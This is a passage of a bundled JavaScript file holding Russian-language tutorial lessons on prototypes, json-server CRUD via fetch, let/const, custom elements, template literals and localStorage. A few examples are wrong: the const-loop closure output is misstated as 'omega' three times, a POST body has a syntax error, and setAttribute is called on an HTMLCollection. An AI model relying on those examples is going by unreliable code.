имитации классов ( в цепочке прототипов отсутствует свойство **~constructor~** ) и оператор **~instanceof~** становится бесполезен\n\nЗато все по-честному ![ico-25 smile]\n\n_______________________________________________________________________\n\n### ![ico-20 icon] Object.&#95;&#95;proto&#95;&#95;\n\nВыведем в консоль свойство **_~&#95;&#95;proto&#95;&#95;~_** конструктора **~Object~**\n\n~~~~console\n▼ __proto__: ƒ ()\n    ► apply: ƒ ()\n      arguments: (...)\n    ► bind: ƒ ()\n    ► call: ƒ ()\n      caller: (...)\n    ► constructor: ƒ ()\n      length: 0\n      name: ""\n    ► toString: ƒ ()\n    ► Symbol(Symbol.hasInstance): ƒ ()\n    ► get arguments: ƒ ()\n    ► set arguments: ƒ ()\n    ► get caller: ƒ ()\n    ► set caller: ƒ ()\n    ► __proto__: Object\n~~~~\n\nа теперь выведем в консоль свойство **~prototype~** конструктора **Function**\n\n~~~~console\n▼ prototype: ƒ ()\n    ► apply: ƒ ()\n      arguments: (...)\n    ► bind: ƒ ()\n    ► call: ƒ ()\n      caller: (...)\n    ► constructor: ƒ ()\n      length: 0\n      name: ""\n    ► toString: ƒ ()\n    ► Symbol(Symbol.hasInstance): ƒ ()\n    ► get arguments: ƒ ()\n    ► set arguments: ƒ ()\n    ► get caller: ƒ ()\n    ► set caller: ƒ ()\n    ► __proto__: Object\n~~~~\n\nОчевидно, что **~Object~** наследует от **~Function~**, что логично, поскольку **~Object~** - это конструктор, т.е. функция\n\n~~~js\nconsole.dir( Object.__proto__.constructor.name)\n// Function\n~~~\n\nПри этом объект **~Function.prototype~** наследует от **~Object~**\n\n(свойство **~Function.prototype.&#95;&#95;proto&#95;&#95;~** является ссылкой на **~Object.prototype~**)\n\nВот такие "сиамские близнецы" ![ico-25 smile]\n\n| ^^Свойство^^ | ^^ссылка на^^ |\n| ~Object.&#95;&#95;proto&#95;&#95;~ | ~Function.prototype~ |\n| ~Function.prototype.&#95;&#95;proto&#95;&#95;~ | ~Object.prototype~ |\n\n_____________________________________________________\n\n## ![ico-25 cap] Пример\n\nhost-объект  **~console~**  имеет свойства   ~log~,  ~dir~,  ~info~,  ~warn~,  ~error~...\n\n^^для получения всех перечислимых свойств host-объекта ~console~ воспользуйтесь оператором  for...in^^\n\n~~~js\nfor (var prop in console) console.log(prop)\n~~~\n\nМы можем обращаться к этим свойствам как к элементам ассоциативного массива:\n\n~~~js\nconsole[\'log\']\nconsole[\'dir\']\nconsole[\'info\']\nconsole[\'warn\']\nconsole[\'error\']\n~~~\n\nПеречисленные свойства имеют тип данных  "**~function~**"\n\nЭто означает, что они являются методами объекта  ~console~\n\n^^Для вызова метода нужно использовать круглые скобки, в которых могут быть (а могут и не быть) аргументы^^\n\nПеречисленные методы вызываются с аргументом\n\n~~~js\nconsole[\'log\'](\'Привет!\')\n~~~\n\n^^в консоль будет выведено "Привет!"^^\n\nСоздадим объект  **presence** следующей структуры:\n\n~~~~js\nvar presence = {\n  \'Артюх Илья\' : true,\n  \'Боднарь Михаил\' : true,\n  \'Гончар Виктор\' : true,\n  \'Дмитренко Пётр\' : true,\n  \'Дорошенко Дмитрий\' : true,\n  \'Калашников Григорий\' : true,\n  \'Кержакова Марина\' : true,\n  \'Москаленко Андрей\' : true,\n  \'Ничипоренко Иван\' : true,\n  \'Опрышкин Дмитрий\' : true,\n  \'Подобреева Юлия\' : true,\n  \'Саратова Ольга\' : false,\n  \'Алескерова Евгения\' : false\n}\n~~~~\n\nТеперь выведем в консоль имена всех свойств объекта **presence** таким образом:\n\n• если свойство имеет значение  _~true~_, то мы выведем имя свойства  в консоль с помощью метода **~console.info~**\n\n• а если свойство имеет значение  _~false~_, то мы выведем имя свойства  в консоль  с помощью метода **~console.error~**\n\nДля определения имени метода объекта  ~console~  используем тернарный оператор:\n\n~~~js\npresence[student] ? \'info\' : \'error\'\n~~~\n\nкоторый вернет значение **"info"**, если  ~presence[student]~ будет **~true~**, или значение **"error"**, если  ~presence[student]~ будет **~false~**\n\n~~~js\nfor (var student in presence) {\n  console[presence[student] ? \'info\' : \'error\'](student)\n}\n~~~\n\nТеперь создадим журнал группы:\n\n~~~~js\nvar group = [\n  {\n    name: \'Артюх Илья\',\n    present: []\n  },\n  {\n    name: \'Боднарь Михаил\',\n    present: []\n  },\n  {\n    name: \'Гончар Виктор\',\n    present: []\n  },\n  {\n    name: \'Дмитренко Пётр\',\n    present: []\n  },\n  {\n    name: \'Дорошенко Дмитрий\',\n    present: []\n  },\n  {\n    name: \'Калашников Григорий\',\n    present: []\n  },\n  {\n    name: \'Кержакова Марина\',\n    present: []\n  },\n  {\n    name: \'Москаленко Андрей\',\n    present: []\n  },\n  {\n    name: \'Ничипоренко Иван\',\n    present: []\n  },\n  {\n    name: \'Опрышкин Дмитрий\',\n    present: []\n  },\n  {\n    name: \'Подобреева Юлия\',\n    present: []\n  },\n  {\n    name: \'Саратова Ольга\',\n    present: []\n  },\n  {\n    name: \'Алескерова Евгения\',\n    present: []\n  }\n]\n~~~~\nи запустим цикл:\n\n~~~js\nvar lessonDate = new Date().toLocaleString().split(\', \')[0]\n\nfor (var student of group) {\n  student.present.push({\n    data: lessonDate,\n    name: presence[student.name]\n  })\n}\n~~~\n\nВыведите результат в консоль\n\n_____________________________________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSf-i0cr7AEXzSJrggqS1AgZz-OBW5ES-l_ntO1R4Q7XZqZaEw/viewform)\n\n__________________________________________________\n\n[![ico-20 link] ^^Global_Objects^^](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects)\n[![ico-20 link] ^^Object-Oriented JavaScript^^](https://developer.mozilla.org/ru/docs/Web/JavaScript/Introduction_to_Object-Oriented_JavaScript)\n'},19042:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='## ![ico-30 icon] JSON server\n\n### ![ico-25 bash] Установка пакета\n\n~npm install -g json-server~\n\n### ![ico-30 db] База данных\n\nСоздадим папку ( например, **_test_** ) и поместим в нее файл  **db.json**:\n\n^^^[db.json]\n\n~~~js\n{\n  "users": [\n    {\n      "id": 1,\n      "name": "Владимир",\n      "lastName": "Кононенко",\n      "email": "vladimir.kononenko@gmail.com",\n      "photoURL": "https://cdn.pixabay.com/photo/2016/03/31/19/58/avatar-1295429_960_720.png"\n    },\n    {\n      "id": 2,\n      "name": "Никита",\n      "lastName": "Терещенко",\n      "email": "nikita.tereshenko@gmail.com",\n      "photoURL": "https://i.pinimg.com/originals/3d/47/4f/3d474f82ff71595e8081f9a120892ae8.gif"\n    },\n    {\n            "id": 3,\n            "name": "Tim",\n            "lastName": "Wagner",\n            "email": "timVagner@gmail.com",\n            "photoURL": "https://vignette.wikia.nocookie.net/yogscast/images/8/8a/Avatar_Turps_2015.jpg"\n    },\n    {\n            "id": 4,\n            "name": "James",\n            "lastName": "Bond",\n            "email": "jamesBond@gmail.com",\n            "photoURL": "https://vignette2.wikia.nocookie.net/yogscast/images/5/59/Avatar_Lewis_2015.png"\n    }\n  ],  \n  "posts": [\n    {\n            "userId": 2,\n            "title": "My first post here",\n            "body": "It\'s really wonder!",\n            "id": 1\n    },\n    {\n            "userId": 2,\n            "id": 2,\n            "title": "Автопробег",\n            "body": "Завтра планируется автопробег. Участвовать могут все желающие"\n    },\n    {\n            "userId": 1,\n            "title": "*Бетономешалка",\n            "body": "Это жесть. Собираюсь купить. Лучше, чем АК!",\n            "id": 3\n    },\n    {\n            "id": 4,\n            "userId": 3,\n            "title": "JS",\n            "body": "Look here - there are some samples"\n    },\n    {\n            "userId": 3,\n            "title": "XMLHttpRequest",\n            "body": "Method POST",\n            "id": 5\n    }\n  ],\n  "comments": [\n    {\n            "postId": 1,\n            "id": 1,\n            "userId": 1,\n            "body": "wow!"\n    },\n    {\n            "postId": 3,\n            "id": 2,\n            "userId": 2,\n            "body": "Hi, I\'m wonder!"\n    },\n    {\n            "postId": 4,\n            "id": 3,\n            "userId": 3,\n            "body": "It\'s really wonder!"\n    },\n    {\n            "postId": 2,\n            "id": 4,\n            "userId": 2,\n            "body": "Ударим автопробегом по бездорожью и разгильдяйству!"\n    }\n  ]\n}\n~~~\n\n^^^\n\n### ![ico-25 bash] Запуск сервера\n\nПерейдем в ![ico-20 bash] Bush и запустим  **JSON Server**  с базой данных **_db.json_**\n\n••$ json-server  &#45;&#45;watch  <путь к файлу>/db.json••\n\nМожно использовать сокращение:\n\n••$ json-server  <путь к файлу>/db.json  -w••\n\nПоскольку мы установили  json-server  глобально, корневой папкой сайта будет папка для установки глобальных пакетов по умолчанию (** ~** )\nУказывая  <путь к файлу>, нужно задавать его относительно этой папки\n\n^^^[<путь к файлу>]\n\n^^В данном случае файл **~users.json~**^^\n^^находится в папке **~z:/home/test~**^^\n^^поэтому нужно указать полный путь к файлу:^^\n~json-server  z:/home/test/users.json –w~\n\n^^^\n\n_______________________________________\n\n### ![ico-20 icon] endpoints\n\nСервер сгенерировал нам **_endpoints_**:\n\n| ![ico-20 bash] | ~http://localhost:3000/users<br>http://localhost:3000/posts<br>http://localhost:3000/comments~ |\n\n(ссылки на ресурсы **_users_**, **_posts_**, **_comments_**, описанные нами в базе данных **users.json**)\n\nТеперь, пока сервер запущен ( т.е. пока вы не воспользуетесь ~Ctrl + C~ в консоли _Bush_ ), можно записывать и вытягивать данные из базы данных, пользуясь указанными **endpoints**\n(при этом в консоли  Bush  логируются все запросы)\n\n_____________________________________\n\n### ![ico-20 icon] fetch\n\nТеперь проверим, как работают наши запросы, из консоли браузера\n\n##### ![ico-25 cap] GET (1)\n\n~~~js\nfetch(\'http://localhost:3000/comments\')\n  .then(response => response.json())\n  .then(json => console.log(json))\n~~~\n\n___________________________________________\n\n##### ![ico-25 cap] GET (2)\n\nТеперь получим данные из базы данных в переменные  **_users_**,  **_posts_** и  **_comments_**, используя функцию  **getData**\n\nВыполним следущий код в консоли браузера:\n\n~~~js\nfunction getData (ref) {\n  return fetch(`http://localhost:3000/${ref}`).then(response => response.json())\n}\n\nPromise.all([\n  getData(\'users\'),\n  getData(\'posts\'),\n  getData(\'comments\')\n])\n  .then(response => {\n    const [users, posts, comments] = response\n    console.log(users, posts, comments)\n  })\n~~~\n\n___________________________________________\n\n##### ![ico-25 cap] POST\n\nДобавим новый комментарий:\n\n~~~js\nfetch(\'http://localhost:3000/comments\', {\n  method: \'POST\',\n  body: JSON.stringify({\n    postId: 1,\n    userID: 1,\n    body: \'Good for you!\'\'\n  }),\n  headers: {\n    \'Content-type\': \'application/json\'\n  }\n})\n    .then ( response => console.log ( \'response: \', response ) )\n~~~\n\n^^Обратите внимание, что поле **id** добавляемой записи вычисляется на стороне сервера^^\n^^Вам не нужно устанавливать его значение^^\n^^( но вы можете это делать, если будете отслеживать существующие значения, потому что в противном случае при попытке записи дублирующихся значений **id** будет сгенерировано исключение )^^<br>\n\nВытащим добавленный коммент в консоли:\n\n~~~js\nfetch ( \'http://localhost:3000/comments?postId=1&id=4\' )\n    .then ( response => response.json () )\n        .then ( json => console.log ( json ) )\n~~~\n\n_________________________________________\n\n##### ![ico-25 cap] PUT\n\nИзменим содержание первого поста :\n\n~~~js\nfetch ( \'http://localhost:3000/posts/1\', {\n    method: \'PUT\',\n    body: JSON.stringify ({\n        userID: 2,\n      \ttitle: "My first post here",\n      \tbody: "It\'s really wonder!"\n    }),\n    headers: {\n        "Content-type": "application/json"\n    }\n})\n   .then ( response => console.log ( \'response: \', response ) )\n~~~\n\n_________________________________________\n\n##### ![ico-25 cap] PATCH\n\nВнесем частичные изменения в содержание первого поста:\n\n~~~js\nfetch ( \'http://localhost:3000/posts/1\', {\n    method: \'PATCH\',\n    body: JSON.stringify ({\n      \ttitle: "Welcome to the hell!",\n    }),\n    headers: {\n        "Content-type": "application/json"\n    }\n})\n   .then ( response => console.log ( \'response: \', response ) )\n~~~\n\n^^Теперь пост со значением ~id~ равным ** 1** будет частично изменен:^^\n^^содержимое поля ~title~ станет "_Welcome to the hell!_",^^\n^^все остальные поля останутся прежними^^\n\n_______________________________________\n\n##### ![ico-25 cap] DELETE\n\nУдалим первый комментарий\n\nВ консоли браузера наберем код:\n\n~~~js\nfetch ( \'http://localhost:3000/comments/1\', {\n    method: \'DELETE\',\n    headers: {\n        "Content-type": "application/json"\n    }\n})\n   .then ( response => console.log ( \'response: \', response ) )\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] XMLHttpRequest\n\n~~~js\nfunction workWithData ( method, url, data ) {\n    let request = new XMLHttpRequest ()\n    request.onload = function ( event ) {\n        console.log ( this.responseText )\n    }\n    request.open ( method, url )\n    request.setRequestHeader (\n        \'Content-type\', \'application/json; charset=utf-8\'\n    )\n    request.send ( data )\n}\n~~~\n\n##### ![ico-25 cap] GET\n\n~~~js\nworkWithData (\n    \'GET\',\n    \'http://localhost:3000/posts\'\n)\n~~~\n\n##### ![ico-25 cap] POST\n\n~~~js\nworkWithData (\n    \'POST\',\n    \'http://localhost:3000/posts\',\n    JSON.stringify ( {\n        userId: 2,\n        title: \'XMLHttpRequest\',\n        body: \'Method POST\'\n    } )\n)\n~~~\n\n##### ![ico-25 cap] DELETE\n\n~~~js\nworkWithData (\n    \'DELETE\',\n    \'http://localhost:3000/posts/7\'\n)\n~~~\n\n##### ![ico-25 cap] PUT\n\n~~~js\nworkWithData (\n    \'PUT\',\n    \'http://localhost:3000/posts/3\',\n    JSON.stringify ( {\n        userId: 2,\n        title: "*Бетономешалка",\n        body: "Это жесть. Собираюсь купить. Лучше, чем АК!"\n    } )\n)\n~~~\n\n\n'},95687:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] let | const\n\n**ES6 ( 2015 )**\n\n________________________\n\n## ![ico-25 icon] let\n\n### ![ico-25 icon] Функциональная и блочная области видимости\n\nОграничить область видимости переменных, объявленных с помощью директивы **_var_**, можно только \"заворачиванием\" их в функцию\n\n![ico-25 pin] Блочная область видимости - это ограничение области видимости в пределах фигурных скобок\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar x = 5\n\n{\n  let x = 15\n  console.log(x) // 15\n}\n\nconsole.log(x)  // 5\n~~~\n\nБлагодаря этому сборщик мусора освобождает память от ненужных переменных при выходе из блочной области видимости\n\n![ico-25 pin] Следствием блочной области видимости переменных, объявленных с помощью директивы **_let_**, является замыкание значения переменной цикла на каждой итерации блока _for_:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nfor (let i of [1, 2, 3, 4, 5]) {\n  setTimeout(() => console.log(i), 1000 * i)\n}\n~~~\n\n__________________________________________________________\n\n![ico-20 warn] Обратите внимание, что отсутствие явных фигурных скобок не меняет принцип поведения переменных, объявленных с помощью директивы **_let_**\n\n◘◘![ico-25 cap] **var**◘◘\n\n~~~js\nconst funcs = []\n\nfor (var item of ['alpha', 'sigma', 'omega']) {\n  funcs.push(() => console.log(item))\n}\nfuncs[0]()  // omega\nfuncs[1]()  // omega\nfuncs[2]()  // omega\n~~~\n\n◘◘![ico-25 cap] **let**◘◘\n\n~~~js\nconst funcs = []\n\nfor (const item of ['alpha', 'sigma', 'omega']) {\n  funcs.push(() => console.log(item))\n}\n\nfuncs[0]()  // omega\nfuncs[1]()  // omega\nfuncs[2]()  // omega\n~~~\n_______________________\n\n### ![ico-25 icon] Hoisting и \"временная мёртвая зона\"\n\n**Hoisting** заключается в том, что переменные \"поднимаются\" от места их объявления в коде до топа их области видимости\n\n**Hoisting** имеет такое же отношение к переменным, объявленным с помощью директивы **_let_**, как и к объявленным с помощью **_var_**\n\n![ico-20 warn] Однако переменные, объявленные с помощью **_let_**, будут недоступны до тех пор, пока выполнение кода не дойдёт до места фактического объявления переменной\n\nТак появляется **_временная мёртвая зона_**\n\nПоэтому в результате выполнения кода:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\n{\n  console.log(x)\n  // [ временная мёртвая зона ]\n  let x = 10\n}\n~~~\n\nбудет сгенерировано исключение:\n\n••![ico-25 err] ReferenceError: Cannot access 'x' before initialization••\n\n_________________________\n\n\n![ico-25 pin] Невозможно повторно объявить переменную с таким же идентификатором в той же области видимости:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nfunction sample () {\n  let figure = {\n    name: 'Radius',\n    size: 50\n  }\n\n  console.log(figure)\n\n  let figure = 10\n  console.log(figure)\n}\nsample ()\n~~~\n\nБудет сгенерировано исключение:\n\n![ico-20 err] ~Uncaught SyntaxError: Identifier 'figure' has already been declared~\n\nв цикле сработает, потому что явно присутствует блок {...}\n\n~~~js\nconst sample = { a: 'img', b: 'div', c: 'p' }\n\nfor (const prop in sample) {\n  const elem = document.body\n    .appendChild(document.createElement(sample[prop]))\n  console.log(elem)\n}\n~~~\n\n![ico-25 pin] ~let~ не создает свойств в глобальном объекте\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nvar x = 25\nlet z = 15\nwindow.x    //  25\nwindow.z    //  undefined\n~~~\n\n______________________\n\n## ![ico-25 icon] const\n\n![ico-20 pin] Блочная область видимости ( как у ~let~ )\n![ico-20 pin] Невозможно дублирование объявления ( как у ~let~ )\n![ico-20 pin] В общем, все, как у ~let~, только:\n![ico-20 warn] Изменить значение нельзя\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst XXX = 11\nXXX = 55\n~~~\n\nБудет сгенерировано исключение:\n\n![ico-20 err] ~Uncaught TypeError: Assignment to constant variable.~\n\n![ico-20 warn] Обязательно при объявлении инициализировать значение\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst XXX\n~~~\n\nБудет сгенерировано исключение:\n\n••![ico-20 err] Uncaught SyntaxError: Missing initializer in const declaration••\n\nЕсли константа является объектом, то значения ее свойств могут быть изменены:\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst user = {\n  login: 'admin',\n  role: 'admin',\n  status: 'active',\n  rights: ['read', 'write', 'delete']\n}\n\nuser.login = 'student'\nuser.role = 'user'\nuser.rights = ['read']\n~~~\n\nАналогично с массивами:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst rights = ['read', 'write', 'delete']\nrights[1] = null\nrights[2] = null\n~~~\n\n_______________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLScPBbEkpMk9CNH935pToTh_BmyE1vqk2rnzu3Mhw9F-D-7V_w/viewform)\n"},22574:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Custom elements\n\n## ![ico-25 icon] lifecycle hooks\n\nКастомные элементы имеют жизненный цикл - от вставки на страницу до удаления из DOM\nЭтапы жизненного цикла - это события в жизни компонента\nНа каждое такое событие компонента можно повесить колбэк\n\n### ![ico-20 icon] connectedCallback()\n\nСрабатывает каждый раз при вставке кастомного элемента в DOM\n\n### ![ico-20 icon] disconnectedCallback()\n\nСрабатывает при удалении кастомного элемента\nСамое удобное время для удаление прослушивателей событий\n\n![ico-20 warn] не сработает при закрытии пользователем вкладки\n\nВ последнем случае лучше использовать событие ~window.onbeforeunload~\n\n~~~js\nwindow.onbeforeunload = function (event) {\n  ...\n  return '...'\n}\n~~~\n\n\n### ![ico-20 icon] attributeChangedCallback()\n\nСрабатывает каждый раз при изменении значений отслеживаемых html-атрибутов элемента\n\n~~~js\nattributeChangedCallback (attrName, oldVal, newVal) {\n  ...\n}\n~~~\n\nАтрибуты кастомного элемента - это удобный интефейс для его взаимодействия с внешним окружением\n\nИзменяя значения атрибутов, можно извне влиять на состояние и поведение веб-компонента\n\nЧтобы указать, какие html-атрибуты нужно отслеживать, используется геттер статического свойства **~observedAttributes~**\n\nимена отслеживаемых атрибутов передаются массивом:\n\n~~~js\nstatic get observedAttributes () {\n  return ['size', 'color']\n}\n~~~\n\nБраузер вызывает **~attributeChangedCallback()~** при изменении значения любого атрибута, включенного в массив отслеживаемых атрибутов **_~observedAttributes~_**\n\n#### ![ico-25 icon] Пример\n\n~~~~js\nclass CircleElement extends HTMLElement {\n  constructor () {\n    super()\n    this.shadow = this.attachShadow({ mode: 'open' })\n    this.shadow.appendChild(document.createElement('div'))\n  }\n\n  connectedCallback () {\n    this.createStyle ()\n  }\n\n  static get observedAttributes () {\n    return [ 'size', 'color']\n  }\n\n  attributeChangedCallback (attrName, oldVal, newVal) {\n    this.setStyle ()\n  }\n\n  createStyle () {\n    this.shadowStyles = document.createElement('style')\n    this.shadow.appendChild(this.shadowStyles)\n    this.shadowStyles.appendChild(document.createTextNode(''))\n  }\n\n  setStyle () {\n    this.shadowStyles.textContent = `\n      div {\n        width: ${this.getAttribute(\"size\")}px;\n        height: ${this.getAttribute(\"size\")}px;\n        border: inset 1px;\n        border-radius: 50%;\n        box-shadow: 3px 3px 5px #00000090;\n        background-color: ${this.getAttribute(\"color\")};\n      }\n      div:hover {\n        box-shadow: inset 3px 3px 5px #00000090;\n      }\n    `\n  }\n}\n\ncustomElements.define('circle-element', CircleElement)\n~~~~\n\nБлагодаря хукам **~connectedCallback~** и **~attributeChangedCallback~** теперь абсолютно все равно, когда будут вставлены кастомные элементы на страницу\n\n~~~js\nfor (const x of ['blue', 'red', 'green', 'yellow']) {\n  const elem = document.body\n    .appendChild(document.createElement('circle-element'))\n\n    elem.setAttribute('color', x)\n    elem.setAttribute('size', Math.round(Math.random() * 200))\n}\n~~~\n\nНо это не главное\n\nВажный момент заключается в том, что при динамическом изменении значений атрибутов без хука **~attributeChangedCallback~** внешний вид кастомного элемента не изменится\n\nОднако если такой хук есть в определении класса, то результатом выполнения кода\n\n~~~js\ndocument\n  .getElementsByTagName('circle-element')\n  .setAttribute('color', 'magenta')\n~~~\n\nбудет изменение внешнего вида (цвета фона) элемента\n\nАналогично кастомный элемент отреагирует на изменение значения атрибута во вкладке **_Elements_**\n\n______________________________________________\n\n[![ico-25 cap] **Пример в песочнице**](https://repl.it/@garevna/customElements-lifecycle-hooks)\n"},29806:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Переменные в литералах\n\n![ico-20 warn] Литерал строки заворачивается в символы обратных кавычек **~`...`~**\n\nЛитерал может содержать многострочный текст,\nт.е. в литерал можно вставлять символ перевода строки\n\n![ico-25 cap] **Пример 1**\n\n~~~js\nvar str = \"\\nПривет,\\nменя зовут Дима\\n\"\n\nvar lit = `\n    Привет,\n    меня зовут Дима\n\n`\n\nconsole.log(str)\nconsole.log(lit)\nconsole.log(str.charCodeAt(0))\nconsole.log(lit.charCodeAt(0))\n~~~\n\n^^Результат в консоли:^^\n\n![](createPath(\"illustrations\", \"string-methods-01.png\"))\n\n^^10 - это код символа перевода строки^^\n\nОбратите внимание, что в обычной строке (**str**) нам пришлось вставлять перевод строки с помощью ~\\n~\n\nВ литерале (**lit**) мы просто набираем многострочный текст, что улучшает читабельность кода\n\nНо это не все достоинства литерала\n\n__________________________________________________________________\n\nКонструкция **~${ имя_переменной }~** позволяет вставлять значения переменных непосредственно в литерал строки\n\n![ico-25 cap] **Пример 2**\n\n~~~js\nvar cities = ['Неаполь', 'Вашингтон', 'Женева']\n\nfor (var i = 0; i < cities.length; i++) {\n  console.log(`${ i + 1 }: ${ cities [ i ] }`)\n}\n~~~\n\n^^Результат в консоли:^^\n\n••1: Неаполь<br>2: Вашингтон<br>3: Женева••\n\n____________________________________________________________________\n\nМожно использовать выражения, значения которых будут вычислены и вставлены в литерал:\n\n![ico-25 cap] **Пример 3**\n\n~~~js\nvar cities = [\n  'Киев',\n  'Львов',\n  'Харьков',\n  'Одесса',\n  'Днепропетровск'\n]\n\nvar str = ''\n\nfor (var x = 0; x < cities.length; x++) {\n  str += `${cities[x].charCodeAt(0)}: ${cities[x]}\\n`\n}\n\nconsole.log(str)\n~~~\n\n^^Результат в консоли:^^\n\n![](createPath(\"illustrations\", \"string-methods-02.png\"))\n\n______________________________________________________________________\n\n![ico-25 cap] **Пример 4**\n\nМожно сгенерировать случайное значение цвета в шестнадцатеричном формате\n\nИспользуем встроенную библиотеку математических функций **~Math~**\n\nДля получения случайного числа от нуля до единицы используем функцию **~Math.random()~**\n\nЗначение цвета в каждом канале может быть от 0 до 255\n\nЧтобы получить число в это диапазоне, умножим случайное число на 255\n\nЗначение цветового канала должно быть целым числом, поэтому округлим результат с помощью функции **~Math.round()~**\n\n~~~js\nvar red = Math.round(Math.random() * 255).toString(16)\nvar green = Math.round(Math.random() * 255).toString(16)\nvar blue = Math.round(Math.random() * 255).toString(16)\n\nvar color = `#${red}${green}${blue}`\n~~~\n\nТеперь в переменной **~color~** будет строка, содержащая значение цвета в шестнадцатеричном формате\n\n______________________________________________________________________________\n\n![ico-25 cap] **Пример 5**\n\nМожно сгенерировать случайное значение цвета с использованием функции **~rgb()~**\n\n~~~js\nvar red = Math.round(Math.random() * 255)\nvar green = Math.round(Math.random() * 255)\nvar blue = Math.round(Math.random() * 255)\n\nvar color = `rgb(${red},${green},${blue})`\n~~~\n\nТеперь в переменной **~color~** будет строка, содержащая значение цвета в модели **~rgb~** с десятичными значениями цвета в каналах\n"},65554:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Данные на клиенте\n\n_______________________________________\n\n## ![ico-25 icon] localStorage\n\n**Локальное хранилище данных на клиенте**\n^^Свойство глобального объекта window^^\n^^Объем 5Mb^^\n\n___________________________________\n\n![ico-25 google]\n\n![](https://lh3.googleusercontent.com/PiqN6DSsKBOXC4M6ziRLdGzKX97HdnP071HwE5J-ooSgqOLK5MXqn118vTcPS-pSpeCqVvDtu-XNYyDrEhFwC5PDpaeBXuQi9o1t63CdNE4KJPTpmpTsuV5u_mbRUDBmsBDzRwYAQSKfTjY)\n\n________________________________\n\n![ico-25 mozilla]\n\n![](https://lh4.googleusercontent.com/iugMdt41GkC9IgOugs_E9vAkMsTGwx_WDI1jm_SHqMmllPKRPOD59Jgvt5Viff0vo_eV8_kRNXDfoWMDQrgUqV0CSr-2Gh1w9RybES4oEh6VUz3TBNNx7n5iVmow7zZHjpgDOXi44O-fw0A)\n\n____________________________\n\n### ![ico-20 icon] Методы\n\n^^^[setItem ( key, value )]\n\n^^поместить данные в хранилище^^\n\n~~~js\nlocalStorage.setItem('figure', 'circle')\nlocalStorage.setItem('circle', 100)\nlocalStorage.setItem('color', 'red')\n~~~\n\nВ ~localStorage~ можно хранить только строки\nПоэтому для сохранения объекта нужно превратить его в строку:\n\n~~~js\nvar user = {\n  name: 'Иван',\n  lastVisit: '27.02.2018',\n  lastPage: '/home/page_07'\n}\n\nlocalStorage.setItem('user', JSON.stringify(user))\n~~~\n![](https://lh6.googleusercontent.com/C5_6UMa6lCRV-0uIPrpFc2EnrRJbpl4GE3TJmu1F5IjBbKVqu7IFK_OhWBnvIzRPX5bCblGaIqRDKlNNG_2r_4J2yriXO0jPcS_MWUHcEQwj8AJ8bziGqU1Kowl4MhQsMnBd3T2jUkwXmhE)\n\n^^^\n\n^^^[getItem (key)]\n\n^^получить данные из хранилища^^\n\n~~~js\nlocalStorage.getItem('figure')  // \"circle\"\nlocalStorage.getItem('circle')  // \"100\"\nlocalStorage.getItem('color')   // \"red\"\n~~~\n\nК данным в хранилище можно получить доступ и так:\n\n~~~js\nlocalStorage['figure']  // вернет \"circle\"\nlocalStorage['circle']  // вернет \"100\"\nlocalStorage['color']   // вернет \"red\"\n~~~\n\nТеперь, если прочитать данные их хранилища\n\n~~~js\nlocalStorage['user']\n~~~\n\nто мы получим строку\n\n~~~js\n'{ \"name\": \"Иван\", \"lastVisit\": \"27.02.2018\", \"lastPage\": \"/home/page_07\" }'\n~~~\n\nЧтобы получить объект user, нужно распарсить эту строку:\n\n~~~js\nJSON.parse(localStorage['user'])\n~~~\n\n^^^\n\n^^^[removeItem (key)]\n\n~~~js\nlocalStorage.removeItem('circle')\n~~~\n\n^^^\n\n^^^[clear()]\n\nочищает хранилище\n\n^^^\n\n\n^^^[key (index)]\n\n![](https://lh4.googleusercontent.com/HIMDL3cti50OFewe729t9aiJogCWrtQzMJklRwdtJqCgswUei2jrvEK0Q23qW3wzerPgfsKlIgHooc75MBUisfhn8OhlxAvQTDI_x3DPxJSJQMgkn-V_G6L7XW9cFrDwllsj7uhP99tFNRo)\n\n^^^\n\n___________________________\n\n![ico-25 cap] ** 1**\n\nПолучим все имена ключей:\n\n~~~js\nlet k = 0\nwhile (k < localStorage.length) {\n  console.log(localStorage.key(k++))\n}\n~~~\n\n_______________________\n\n![ico-25 cap] ** 2**\n\n~~~js\nlocalStorage.setItem('url', location.href)\n\nconst user = {\n  name: prompt('Enter your name'),\n  last_visit: new Date().toLocaleString().split(', ')[0]\n}\n\nlocalStorage.setItem('user', JSON.stringify(user))\n~~~\n\nЕсли вывести в косоль свойства объекта localStorage:\n\n~~~js\nfor (const key in localStorage) console.log(key)\n~~~\n\nто в консоли мы увидим не только имена помещенных нами в хранилище данных, но и имена прототипных свойств и методов объекта ~localStorage~:\n\n~~~console\ncircle\ncolor\nfigure\nuser\nlength\nkey\ngetItem\nsetItem\nremoveItem\nclear\n~~~\n\n______________________\n\n![ico-25 cap] ** 3**\n\nМы можем добавить новые методы объекту ~localStorage~, используя свойство ~prototype~ конструктора ~Storage~\n\n~~~js\nStorage.prototype.getItemList = function () {\n  for (const key in this) {\n    console.log(key, ': ', this[key])\n  }\n}\n~~~\n\n![](https://lh4.googleusercontent.com/7xyx1vvwXZw0F1hQx7dR3HUca227YXbz5ScaTplal2XqZxsVeGT_OIb-JQomW5Ao0ZVqQSeQvdeUBShrPB4_yRioGo_0MnYiu9GU7WiXvd-2-VyiO4Z-IcFhrogdPtz7JM10SQbKg_OU7gA)\n\n^^Как видите, мы можем расширять функциональность объекта 